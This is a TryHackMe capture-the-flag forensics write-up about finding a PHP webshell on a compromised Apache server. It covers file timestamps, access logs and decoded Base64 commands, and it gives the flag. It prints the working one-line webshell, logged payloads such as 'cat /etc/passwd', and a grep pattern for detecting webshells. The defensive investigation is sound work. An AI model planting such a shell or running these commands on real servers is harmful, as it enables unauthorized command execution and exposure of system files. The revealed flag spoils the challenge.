# TryHackMe — Infinity Shell

## Room Overview

**Infinity Shell** is a web forensics investigation involving an implanted PHP webshell.

The objective is to investigate the compromised web server, identify the malicious file, analyze Apache logs, reconstruct the attacker's activity, and recover the flag.

---

## Objectives

* Locate suspicious files in the web server.
* Identify the implanted webshell.
* Analyze file timestamps and ownership.
* Investigate Apache access logs.
* Identify the attacker's IP address.
* Decode Base64-encoded commands.
* Reconstruct the attack timeline.
* Recover the flag.

---

## 1. Locate the Web Application

Navigate to the Apache web root:

```bash
cd /var/www/html
ls -la
```

The compromised application was found at:

```text
/var/www/html/CMSsite-master
```

Navigate into it:

```bash
cd /var/www/html/CMSsite-master
```

---

## 2. Investigate File Timestamps

Check recently modified files:

```bash
find . -type f -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\n' | sort
```

Most of the CMS files had timestamps from **2022**, while two files stood out with timestamps from **2025**:

```text
./includes/db.php
./img/images.php
```

The suspicious file was:

```text
./img/images.php
```

---

## 3. Analyze the Suspicious PHP File

Check the file:

```bash
ls -lah img/images.php
file img/images.php
cat img/images.php
```

Contents:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This is a PHP webshell.

### How it works

The webshell takes a GET parameter named `query`:

```text
?query=<base64-data>
```

It then performs:

```text
$_GET['query']
      ↓
base64_decode()
      ↓
system()
      ↓
Command execution
```

Therefore, an attacker can send a Base64-encoded operating-system command through the URL and have the server execute it.

---

## 4. Investigate Apache Logs

Apache logs can reveal requests made to the compromised application.

Search for requests involving the webshell:

```bash
sudo grep -RniE 'images\.php|CMSsite|upload|POST|GET' /var/log/apache2/ 2>/dev/null
```

To investigate activity around a specific time:

```bash
sudo grep -RniE 'images\.php|CMSsite|upload|POST|GET' /var/log/apache2/ 2>/dev/null | grep "09:51:20"
```

An important request was:

```text
GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

The attacker IP was:

```text
10.11.93.143
```

---

## 5. Decode the Base64 Payload

Extract the Base64 value:

```text
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

Decode it using:

```bash
echo 'ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=' | base64 -d
```

Result:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

### Important

The complete Base64 string ends with:

```text
=
```

Removing the padding may produce:

```text
base64: invalid input
```

The correct command is:

```bash
echo 'ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=' | base64 -d
```

---

## 6. Attacker Commands

Other Base64 payloads found in the logs can be decoded in the same way.

### `whoami`

```text
d2hvYW1pCg==
```

Decoded:

```bash
whoami
```

### `ls`

```text
bHMK
```

Decoded:

```bash
ls
```

### `ifconfig`

```text
aWZjb25maWcK
```

Decoded:

```bash
ifconfig
```

### `/etc/passwd`

```text
Y2F0IC9ldGMvcGFzc3dkCg==
```

Decoded:

```bash
cat /etc/passwd
```

### `id`

```text
aWQK
```

Decoded:

```bash
id
```

### Flag command

```text
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

Decoded:

```bash
echo 'THM{sup3r_43sy_w3bsh3ll}'
```

---

## 7. Attack Timeline

The attack can be summarized as follows:

```text
09:49:10
    |
    └── Attacker 10.11.93.143 sends POST request to:
        /CMSsite-master/admin/profile.php?section=not_cipher
    |
    └── Requests to images.php initially return 404
        indicating the webshell was not yet available
    |
09:50:32
    |
    └── img/images.php appears on the server
        |
        └── PHP webshell is now available
    |
09:50:33+
    |
    └── Attacker accesses images.php
        |
        ├── whoami
        ├── ls
        ├── ifconfig
        ├── cat /etc/passwd
        ├── id
        └── echo flag
```

---

## 8. Useful Investigation Commands

### Find recently modified files

```bash
find /var/www/html -type f -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\n' | sort
```

### Search for PHP webshell patterns

```bash
grep -RniE 'system\(|shell_exec\(|exec\(|passthru\(|base64_decode\(' /var/www/html 2>/dev/null
```

### Search Apache logs for a specific file

```bash
sudo grep -Rni 'images.php' /var/log/apache2/
```

### Search for attacker IP

```bash
sudo grep -Rni '10.11.93.143' /var/log/apache2/
```

### Decode Base64

```bash
echo '<BASE64_STRING>' | base64 -d
```

---

## Flag

```text
THM{sup3r_43sy_w3bsh3ll}
```

---

## Key Takeaways

### 1. File timestamps are valuable

A file that suddenly appears or is modified years after the rest of the application can be an important indicator of compromise.

### 2. Webshells provide remote command execution

The following code is extremely dangerous:

```php
system(base64_decode($_GET['query']));
```

It allows remote users to execute operating-system commands.

### 3. Base64 is not encryption

Base64 only encodes data. It can easily be decoded:

```bash
echo '<payload>' | base64 -d
```

Attackers may use Base64 to make malicious commands less obvious in URLs and logs.

### 4. Apache logs are useful forensic evidence

Access logs can reveal:

* Source IP addresses
* Requested URLs
* HTTP methods
* Request timestamps
* User-Agent information
* Webshell parameters
* Attacker commands

### 5. Build a timeline

Combining file metadata with web-server logs helps reconstruct the sequence of events and understand how the compromise progressed.

---

## Conclusion

The investigation identified `img/images.php` as an implanted PHP webshell. The attacker, originating from `10.11.93.143`, used the `query` parameter to submit Base64-encoded commands.

The webshell decoded the commands and executed them using PHP's `system()` function.

The attacker's activity included basic system reconnaissance and ultimately execution of a command that revealed the challenge flag:

```text
THM{sup3r_43sy_w3bsh3ll}
```